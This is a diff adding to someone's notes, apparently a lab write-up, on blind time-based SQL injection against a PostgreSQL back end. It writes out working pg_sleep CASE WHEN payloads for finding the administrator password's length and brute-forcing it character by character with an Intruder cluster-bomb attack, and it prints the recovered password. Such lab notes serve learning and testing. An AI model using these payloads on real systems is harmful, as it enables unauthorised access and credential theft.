@@ -22,6 +22,31 @@ username='administrator')||'
 
 it doesnt... however this is because of the ='a' rather than
 using >'a', when using this instead we get the sleep.
-Meaning the password first letter is greater than a.
+Meaning the password first letter is > a.
+
+We will now check the length of the password using the LENGTH()
+function:
+'||(SELECT CASE WHEN LENGTH(password)> 10
+THEN pg_sleep(10) ELSE '' END FROM users WHERE 
+username='administrator')||'
+
+found the length to be 20 characters long
+
+
+knowing this we can now use intruder and cluster bomb the values 
+for an attack.
+Using the following payloads:
+'||(SELECT CASE WHEN SUBSTR(password,§1§,1)= '§a§' 
+THEN pg_sleep(100) 
+ELSE '' 
+END FROM users WHERE username='administrator')||
+
+using the brute force was able to get this password by seeing how 
+long a response would take to come back, if the response came back instantly
+then no hit. However if there was a delay the payload was correct.
+
+password got from this:
+xk9mxn2vw5uymjoawrmt
+
 
 
